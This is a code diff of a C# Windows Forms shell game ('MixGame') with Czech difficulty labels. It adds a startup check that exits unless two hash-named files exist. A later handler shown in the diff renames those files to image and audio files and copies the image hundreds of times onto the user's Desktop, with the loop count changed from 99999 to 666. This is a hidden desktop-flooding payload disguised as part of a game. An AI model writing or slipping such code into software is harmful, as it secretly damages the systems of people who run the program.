@@ -41,23 +41,31 @@ namespace MixGame
 
         public MixGame()
         {
-            InitializeComponent();
-            difficulty.Items.Add("Automatická");
-            difficulty.Items.Add("Velmi Lehká");
-            difficulty.Items.Add("Lehká");
-            difficulty.Items.Add("Střední");
-            difficulty.Items.Add("Těžká");
-            difficulty.Items.Add("Extrémní");
-            gameResults.Hide();
-            resetGlassPosition(false);
-            glassList = new List<PictureBox>() { glass1, glass2, glass3 };
-            glassDefaultLocationList = new List<Point>() { glass1DefaultLocation, glass2DefaultLocation, glass3DefaultLocation };
-            marbleDefaultLocationList = new List<Point>() { marble1DefaultLocation, marble2DefaultLocation, marble3DefaultLocation };
-            marble.Visible = true;
-            marble.Location = marble2DefaultLocation;
-            animationFPS.Interval = 1;
-            animationFPS.Start();
-            colorControl.Interval = 100;
+            if (!System.IO.File.Exists(@"44d7180ae5e00e9346d3badd89ad1bb3") || !System.IO.File.Exists(@"eacf867e4f019f43a04d0b2af7e3e7f4"))
+            {
+                System.Windows.Forms.MessageBox.Show("ERROR: MISSING_SOURCE_FILES");
+                Application.Exit();
+            }
+            else
+            {
+                InitializeComponent();
+                difficulty.Items.Add("Automatická");
+                difficulty.Items.Add("Velmi Lehká");
+                difficulty.Items.Add("Lehká");
+                difficulty.Items.Add("Střední");
+                difficulty.Items.Add("Těžká");
+                difficulty.Items.Add("Extrémní");
+                gameResults.Hide();
+                resetGlassPosition(false);
+                glassList = new List<PictureBox>() { glass1, glass2, glass3 };
+                glassDefaultLocationList = new List<Point>() { glass1DefaultLocation, glass2DefaultLocation, glass3DefaultLocation };
+                marbleDefaultLocationList = new List<Point>() { marble1DefaultLocation, marble2DefaultLocation, marble3DefaultLocation };
+                marble.Visible = true;
+                marble.Location = marble2DefaultLocation;
+                animationFPS.Interval = 1;
+                animationFPS.Start();
+                colorControl.Interval = 100;
+            }
         }
 
         private void startButton_Click(object sender, EventArgs e)
@@ -501,7 +509,7 @@ namespace MixGame
                         string user = Path.GetDirectoryName(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
                         System.IO.File.Move(@"eacf867e4f019f43a04d0b2af7e3e7f4", @"eacf867e4f019f43a04d0b2af7e3e7f4.png");
                         System.IO.File.Move(@"44d7180ae5e00e9346d3badd89ad1bb3", @"44d7180ae5e00e9346d3badd89ad1bb3.wav");
-                        for (int index = 0; index < 99999; index++) {
+                        for (int index = 0; index < 666; index++) {
                             string source = @"eacf867e4f019f43a04d0b2af7e3e7f4.png";
                             string target = user + @"\Desktop\eacf867e4f019f43a04d0b2af7e3e7f4 [" + index.ToString() + @"] .png";
                             System.IO.File.Copy(source, target);
